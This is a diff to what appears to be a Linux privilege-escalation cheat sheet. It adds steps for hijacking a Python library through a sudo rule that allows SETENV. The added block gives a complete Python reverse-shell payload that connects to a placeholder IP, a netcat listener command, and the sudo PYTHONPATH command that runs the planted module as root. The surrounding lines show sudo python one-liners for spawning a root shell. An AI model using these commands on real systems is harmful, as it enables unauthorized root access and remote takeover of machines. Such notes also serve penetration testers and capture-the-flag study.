@@ -250,6 +250,21 @@ sudo python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 sudo python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
+```
+(root) SETENV: NOPASSWD: /usr/bin/python3 /home/user/python_script.py
+//There is some kinda python lib hijacking. In short, to hijack, follow the steps:
+//get the location of python library (which is being used), in our case its /usr/lib/python3.8/
+//copy the example.py file to /tmp
+//cp /usr/lib/python3.8/example.py /tmp/example.py
+//add the reverse shell in the example.py file (where ever you want)
+//reverse shell used:
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+//Start the listener
+nc -lnvp 1234
+//to get the shell, run the command
+sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/user/python_script.py (which includes example.py library)
+//The PYTHONPATH environment variable indicates a directory (or directories), where Python can search for modules to import.
+```
 
 Less
 ```
